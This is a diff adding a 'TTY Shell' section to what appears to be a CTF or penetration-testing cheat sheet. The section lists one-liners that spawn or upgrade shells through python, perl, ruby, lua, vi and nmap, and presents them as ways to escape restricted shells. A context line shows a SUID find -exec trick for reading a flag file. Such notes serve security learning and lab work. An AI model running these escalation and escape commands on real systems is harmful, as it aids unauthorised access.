@@ -970,8 +970,30 @@ If you don't have privilege, try this
 “s” = SUID. This means that any user can execute these commands and they will be ran as the original owner.
 
 **Example**  
-Lets say the `cat` command had the 's' in its SUID. Then you would be able to use something like the following command:  
+Lets say the `cat` command had the 's' in its SUID. Then you would be able to use something like the following command to read a flag:  
 `find /home/berkan/flag1.txt -exec cat {} \;`
+
+## TTY Shell
+The tty command of terminal basically prints the file name of the terminal connected to standard input. tty is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system
+
+**Shell Spawning**  
+`python -c 'import pty; pty.spawn("/bin/sh")'`  
+`echo os.system('/bin/bash')`  
+`/bin/sh -i`  
+`perl —e 'exec "/bin/sh";'`  
+`perl: exec "/bin/sh";`  
+`ruby: exec "/bin/sh"`  
+`lua: os.execute('/bin/sh')`  
+From within IRB  
+`exec "/bin/sh"`  
+From within vi  
+`:!bash`  
+From within vi  
+`:set shell=/bin/bash:shell`  
+From within nmap  
+`!sh`  
+
+Many of these will also allow you to escape jail shells. The top 3 would be my most successful in general for spawning from the command line.
 
 ## Phishing
 
